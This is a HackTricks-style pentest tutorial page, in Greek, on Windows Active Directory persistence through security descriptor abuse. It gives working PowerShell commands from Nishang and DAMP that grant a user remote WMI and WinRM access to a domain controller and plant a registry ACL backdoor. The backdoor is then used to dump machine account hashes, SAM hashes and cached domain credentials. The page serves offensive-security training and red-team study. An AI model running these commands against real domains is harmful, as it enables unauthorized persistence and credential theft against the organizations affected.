# Security Descriptors

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptors

[Από τα έγγραφα](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Η Γλώσσα Ορισμού Ασφαλείας (SDDL) ορίζει τη μορφή που χρησιμοποιείται για να περιγράψει έναν ασφαλιστικό περιγραφέα. Η SDDL χρησιμοποιεί συμβολοσειρές ACE για DACL και SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

Οι **ασφαλιστικοί περιγραφείς** χρησιμοποιούνται για να **αποθηκεύσουν** τις **άδειες** που έχει ένα **αντικείμενο** **πάνω** σε ένα **αντικείμενο**. Αν μπορείτε να **κάνετε** μια **μικρή αλλαγή** στον **ασφαλιστικό περιγραφέα** ενός αντικειμένου, μπορείτε να αποκτήσετε πολύ ενδιαφέροντα προνόμια πάνω σε αυτό το αντικείμενο χωρίς να χρειάζεται να είστε μέλος μιας προνομιούχας ομάδας.

Τότε, αυτή η τεχνική επιμονής βασίζεται στην ικανότητα να αποκτήσετε κάθε προνόμιο που απαιτείται κατά ορισμένων αντικειμένων, ώστε να μπορείτε να εκτελέσετε μια εργασία που συνήθως απαιτεί προνόμια διαχειριστή αλλά χωρίς την ανάγκη να είστε διαχειριστής.

### Access to WMI

Μπορείτε να δώσετε σε έναν χρήστη πρόσβαση για **να εκτελεί απομακρυσμένα WMI** [**χρησιμοποιώντας αυτό**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Πρόσβαση στο WinRM

Δώστε πρόσβαση στο **winrm PS console σε έναν χρήστη** [**χρησιμοποιώντας αυτό**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Απομακρυσμένη πρόσβαση σε hashes

Πρόσβαση στο **registry** και **dump hashes** δημιουργώντας ένα **Reg backdoor using** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** ώστε να μπορείτε ανά πάσα στιγμή να ανακτήσετε το **hash του υπολογιστή**, το **SAM** και οποιαδήποτε **cached AD** διαπιστευτήρια στον υπολογιστή. Έτσι, είναι πολύ χρήσιμο να δώσετε αυτή την άδεια σε έναν **κανονικό χρήστη κατά ενός υπολογιστή Domain Controller**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Ελέγξτε [**Silver Tickets**](silver-ticket.md) για να μάθετε πώς μπορείτε να χρησιμοποιήσετε το hash του λογαριασμού υπολογιστή ενός Domain Controller.

{{#include ../../banners/hacktricks-training.md}}
